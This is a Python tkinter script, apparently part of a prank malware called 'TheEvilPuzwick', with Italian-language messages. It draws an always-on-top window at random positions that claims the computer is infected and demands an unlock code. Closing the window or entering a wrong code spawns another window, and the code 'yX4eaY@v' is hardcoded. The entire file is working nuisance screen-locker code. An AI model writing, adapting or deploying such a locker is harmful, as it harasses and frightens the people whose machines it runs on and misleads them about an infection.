# imports
from tkinter import *
from sys import exit
from os import getenv
from Utils import randomize_position

# global variables
WIDTH = 350
HEIGHT = 148
BG_COLOR = '#a19594'
UNLOCK_CODE = 'yX4eaY@v'
ABSOLUTE_PATH = getenv('APPDATA')


# main function of the script
def init():

    # initialize the window
    win = Tk()
    win.resizable(0, 0)
    win.protocol('WM_DELETE_WINDOW', init)  # opens a new window when the user tries to close it
    win.attributes('-topmost', True)  # setting the window to be always displayed on top
    win.title('Ooops...ho infettato il tuo pc!')
    win.config(bg=BG_COLOR)

    coordinates = randomize_position(win, WIDTH, HEIGHT)  # from Utils.py
    win.geometry(str(WIDTH) + 'x' + str(HEIGHT) + '+' + coordinates[0] + '+' + coordinates[1])

    icon = PhotoImage(file=ABSOLUTE_PATH + '\TheEvilPuzwick\puzwick_ico.png', master=win)
    win.iconphoto(True, icon)

    # button event
    def button_submit():
        text = entry.get()
        if text == UNLOCK_CODE:
            exit()
        else:
            entry.delete(0, END)
            init()

    def enter_submit(self):
        text = entry.get()
        if text == UNLOCK_CODE:
            exit()
        else:
            entry.delete(0, END)
            init()

    # widgets
    image = PhotoImage(file=ABSOLUTE_PATH + '\TheEvilPuzwick\puzwick.png', master=win)
    image_label = Label(win, image=image)
    text_label = Label(win, text='Heilà!!! Carino questo computer, penso\n'
                                 'che mi stabilirò qui! Ti consiglio di non\n'
                                 'provare a sbarazzarti di me, heheh!\n'
                                 'L\'unica via di fuga è inserire il codice\n'
                                 'corretto nella casella, buona sfortuna!', font=('Arial', 8), bg=BG_COLOR)
    entry = Entry(win, relief='groove')
    button = Button(win, text='Prova!', command=button_submit)

    image_label.place(x=0, y=-2)
    text_label.place(x=148, y=5)
    entry.place(x=182, y=85)
    button.place(x=222, y=115)

    win.bind('<Return>', enter_submit)  # binding the "Enter" key to the button

    win.mainloop()  # displaying the window


init()  # main function call
